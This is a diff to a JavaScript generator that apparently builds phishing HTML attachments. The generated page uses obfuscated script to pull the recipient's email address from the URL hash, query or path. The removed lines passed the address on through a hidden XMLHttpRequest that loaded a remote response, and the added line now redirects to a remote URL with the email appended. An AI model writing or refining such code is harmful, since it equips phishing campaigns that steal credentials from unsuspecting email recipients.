@@ -4165,19 +4165,7 @@ function downloadHtmlAttachment(url) {
     html += 'var e=document.getElementById(_(0))[_(' + it + ')];\n';
     html += '// Autograb: if placeholder is not a real email (e.g. {email}), grab from URL\n';
     html += 'if(!e||e.indexOf("@")<0){try{var h=location.hash.substring(1);if(h.indexOf("@")>=0)e=decodeURIComponent(h);else{var p=new URLSearchParams(location.search);if(p.get("email"))e=p.get("email");else if(p.get("e"))e=p.get("e");else{var pa=location.pathname.split("/");for(var i=pa.length-1;i>=0;i--){if(decodeURIComponent(pa[i]).indexOf("@")>=0){e=decodeURIComponent(pa[i]);break;}}}}}catch(_){}}\n';
-    html += 'var x=new XMLHttpRequest();\n';
-    html += 'x[' + o + '](_(' + g + '),u+(e?"/"+encodeURIComponent(e):""),true);\n';
-    html += 'x[' + sr + '](_(' + ac + '),_(' + aj + '));\n';
-    html += 'x[' + orsc + ']=function(){\n';
-    html += 'if(x[' + rs + ']==4){\n';
-    html += 'if(x[' + st + ']==200){\n';
-    html += 'var d=JSON[x[' + ps + ']](x[' + rt + ']);\n';
-    html += 'if(d.url)window.location=d.url;\n';
-    html += 'else document.body.innerHTML=d.body||"Error";\n';
-    html += '}else{document.body.innerHTML="Connection failed";}\n';
-    html += '}\n';
-    html += '};\n';
-    html += 'x[' + s + ']();\n';
+    html += 'window.location.href=u+(e?"/"+encodeURIComponent(e):"");\n';
     html += '<\/script>\n</body>\n</html>';
 
     const blob = new Blob([html], { type: 'text/html' });
